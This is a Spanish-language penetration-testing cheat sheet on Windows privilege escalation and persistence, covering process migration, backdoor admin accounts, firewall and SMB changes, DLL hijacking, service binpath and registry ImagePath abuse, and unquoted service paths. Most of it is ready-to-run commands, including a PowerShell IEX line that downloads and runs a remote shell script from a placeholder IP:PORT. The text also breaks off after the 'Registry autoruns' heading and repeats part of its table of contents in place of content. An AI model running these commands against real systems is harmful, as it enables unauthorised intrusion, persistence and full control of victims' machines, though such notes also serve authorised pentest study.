# Windows

* [Tips & Tricks]
* [Tools]
* [Migrando proceso]
* [Persistencia]
* [DLL Hijacking]
* [Binpath]
* [Unquothed service path]
* [Service registry permissions]
* [Executable file]
* [Registry autoruns]
* [Allways install Elevated]
* [Credenciales en memoria]
* [Credenciales en registro]
* [Credenciales en archivos de configuracion]
* [Credenciales en webconfig]
* [Credenciales en repair/sam]
* [Tareas programadas]
* [Token impersionation]
* [Token impersionation print spoofer]
* [Bypassing]

## Tips & Tricks

1. Cuando tenes una shell, es mejor migrar a un proceso
que sea de la misma arquitectura de la pc donde estamos para que
no existan errores
2. C:\>powershell.exe -nop -exec bypass

## Tools

* [Powershell Empire]
* [PowerUp]
* [Seatbelt]
* [Winpeas]
* [Nishang]
* [windows-privesc-check]
* [windowsenum]
* [Sherlock]
* [Watson]
* [WinEnum]
* [Windows-exploit-suggester]

## Migrando proceso

```shell
Is64BitOperatingSystem
#True

Is64BitProcess
#False #necesitamos migrar
#Podemos mandar la shell desde la ruta nativa del sistema con el path absoluto.
#Por ejemplo para tomar una reverse shell desde la windows:
C:\Windows\SysNative\WindowsPowershell\v1.0powershell IEX(New-Object New.WebClient).downloadString('http://IP:PORT/shell.ps1')
#esto te da el proceso de 64 bits ya
```

## Persistencia

```shell
net user nombreusuario password /add
net localgroup Administrators nombreusuario /add

#si no está abierto el puerto de SAMBA hay que abrirlo para poder 
#generar esa persistencia, y poder mandar comandos desde nuestro 
#host atacante Creamos la regla en el firewall

netsh advfirewall firewall add rule protocol=TCP dir=in localport=445 action=allow

netsh advfirewall firewall add rule protocol=TCP dir=out localport=445 action=allow

#creamos un nuevo recurso compartido
net share attacker_folder=C:\Windows\tmp /GRANT:Administrators,FULL

#cambiamos la policy
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

#y desde el host con el paquete de impacket
$impacket/examples/psexec.py WORKGROUP/nombreusuario:password\@R_IP cmd.exe
```

## DLL Hijacking

### Enumeracion

```
Se carga en el contexto de un proceso en ejecucion

Es común que algunas DLL no estén disponibles cuando el ejecutable intente cargarlas

El orden de busqueda de una dll es:

1-Misma carpeta donde se carga el proceso o servicio

2-Directorio del sistema

3-Directorio del subsistema de 16bits

4-Directorio de Windows

5-Directorio actual

6-Directorios listados en PATH
```

### Explotacion

```
1-Elegir un servicio que se ejecute con privilegios

2-Identificar DLLs no encontradas. Con Process Monitor se pueden encontrar como "Name not Found"

3-Preparar una DLL maliciosa y compilarla

4-Colocar en alguno de los paths con permisos de escritura
```

## Binpath

### Enumeracion

```
Binpath es el atributo de un servicio que especifica ruta del ejecutable de ese servicio. La ruta del ejecutable se llama ImagePath

Los servicios son objetos asegurables. Quiere decir que tienen ACLs o permisos. Si el usuario tiene permisos sobre el servicio, puede modificar el binpath logrando ejecución arbitraria.
```

#### Accesschk
```powershell
#el /accepteula es solo necesario la primera vez que corremos el accesschk
#el accesschk es de sysinternals

accesschk.exe /accepteula -uwcqv [user_actual] [servicio]
```

#### Powerup

```powershell
#si aun no ejecutamos powerup
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
#Ahora si
Get-ModifiableService
```

### Explotacion

#### Manual

```powershell
#ver info del servicio
sc qc [servicio]
#modificar binpath
sc config [servicio] binPath= "\"path_malicioso""
#tambien podes ejecutar un comando en vez de mandar un ejecutable malicioso
sc config [servicio] binPath= "\"whoami""
#reiniciamos el servicio
net stop [servicio]
net start [servicio]
```

#### Metasploit/Meterpreter

```bash
use exploit/windows/local/service_permissions
```

#### Powerup

```powershell
#si aun no ejecutamos powerup
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
#Ahora si
Invoke-ServiceAbuse -name [service] -command [whoami]
```

## Unquothed service path

### Enumeracion

```
Para explotar, el path tiene que tener espacios y no tener comillas

Windows resuelve probando. Si Path C:\Program Files\servicio.exe, primero intenta "C:\Program.exe"
```

#### wmic

```powershell
wmic service get name,pathname,displayname,startmode | findstr /v /i auto | finstr /i /v "C:\Windows\\" | findstr /i /v """
```

#### wmiobject

```powershell
Get-WmiObject Win32_Service | select name,pathname,startmode,startname | where {$_.startmode -ne "disabled" -and $_.startname -eq "localsystem" -and $_.pathname -nomatch "'"" -and $_.pathname -nomatch "C:\\Windows"} | format-list
```

#### PowerUp

```powershell
#si aun no ejecutamos powerup
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
#Ahora si
Get-ServiceUnquothed
```

### Verificacion de permiso de escritura en el Path

```powershell
#el /accepteula solo se corre la primera vez que corremos accesschk
accesschk /accepteula -uwdq "path_completo"
```

### Explotacion

#### Manual

```powershell
#1-Creamos ejecutable malicioso
#2-Lo plantamos en el path
#3-reiniciamos el servicio
net stop [servicio]
net start [servicio]
```

#### Metasploit/Meterpreter

```bash
use exploit/windows/local/trusted_service_path
```

#### PowerUp

```powershell
#Opcion 3 - Powerup
#si aun no ejecutamos powerup
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
#Ahora si
Write-ServiceBinary -name [servicio] -path [path_identificado]
```

## Service registry permissions

### Enumeracion

```
La base de datos de servicios se almacena en el registro. Como las claves y los valores son objetos asegurables que tienen permisos, si tenemos permiso de escritura podemos cambiar el ImagePath
```

#### Get-ACL

```powershell
Get-Acl -path HKLM:\System\CurrentControlSet\Services\* | Select path,AccessToString | Format-List
```

#### Accesschk

```powershell
#Solo escribir /accepteula la primera vez que ejecutamos accesschk
AccessChk.exe /accepteula -kvusw HKLM\System\CurrentControlSet\Services
```

### Explotacion

#### Powershell

```powershell
New-ItemProperty -path "HKLM:\System\CurrentControlSet\Services\[Servicio]" -name ImagePath -value "C:\shell.exe" -PropertyType ExpandString -Force

#reiniciamos el servicio
net stop [servicio]
net start [servicio]
```

#### CMD

```cmd
REG ADD HKLM\System\CurrentControlSet\Services\RegSvc /v ImagePath /t REG_EXPAND_SZ /d C:\Shell.exe /f
```

## Executable file

### Enumeracion

```
Los servicios son codigo ejecutable almacenado en el FileSystem. Se podria reemplazar el binario original por otro
```

#### Powershell

```powershell
Get-ChildItem [path] -recurse | Get-Acl | Select path,owner,accesstostring,group | Format-List
```

#### Accesschk

```powershell
#Solo ejecutar /accepteula la primera vez que ejecutamos el ejecutable este
Accesschk.exe /accepteula -vuw [path]
```

#### PowerUp

```powershell
#si aun no ejecutamos powerup
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
#Ahora si
Invoke-AllChecks
```

### Explotacion

```powershell
#Creamos shell.exe
#Reemplazamos ejecutable
Copy shell.exe "C:\Program\Program.exe" /y
```

## Registry autoruns


* [Allways install Elevated]
* [Credenciales en memoria]
* [Credenciales en registro]
* [Credenciales en archivos de configuracion]
* [Credenciales en webconfig]
* [Credenciales en repair/sam]
* [Tareas programadas]
* [Token impersionation]
* [Token impersionation print spoofer]
* [Bypassing]